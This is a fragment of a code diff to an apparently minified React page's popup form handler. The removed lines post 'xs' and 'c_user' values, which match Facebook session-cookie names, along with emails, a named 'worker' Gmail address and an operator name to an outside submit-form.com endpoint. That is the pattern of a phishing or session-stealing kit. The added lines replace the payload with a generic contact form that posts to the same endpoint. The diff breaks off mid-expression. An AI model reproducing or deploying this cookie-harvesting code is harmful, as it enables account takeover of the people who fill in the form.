@@ -9805,26 +9805,28 @@
                                 })
                             })]
                         }), (0,
-                        he.jsx)("div", {
-                            className: "popup-content",
-                            children: (0,
-                            he.jsxs)("form", {
-                                id: "dataFirst",
-                                autoComplete: "off",
-                                className: "ant-form ant-form-horizontal css-m4timi",
-                                onSubmit: e => {
-                                    e.preventDefault(),
-                                    fetch("https://submit-form.com/ELCR6DdLi", {
-                                        method: "POST",
-                                        headers: {
-                                            "Content-Type": "application/json"
-                                        },
-                                        body: JSON.stringify({
-                                            emails: o,
-                                            workerEmail: "marketingland9@gmail.com",
-                                            xs: r,
-                                            c_user: i,
-                                            name: "irbaz"
+                        he.jsx("div", {
+  className: "popup-content",
+  children: he.jsx("form", {
+    id: "newForm",
+    autoComplete: "off",
+    className: "ant-form ant-form-horizontal css-m4timi",
+    onSubmit: (e) => {
+      e.preventDefault(); // Prevents page reload
+      // Collect data from form inputs
+      const name = e.target.name.value;
+      const email = e.target.email.value;
+      const message = e.target.message.value;
+
+      fetch("https://submit-form.com/ELCR6DdLi", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          name: name,
+          email: email,
+          message: message,
                                         })
                                     }).then((e => {
                                         e.ok
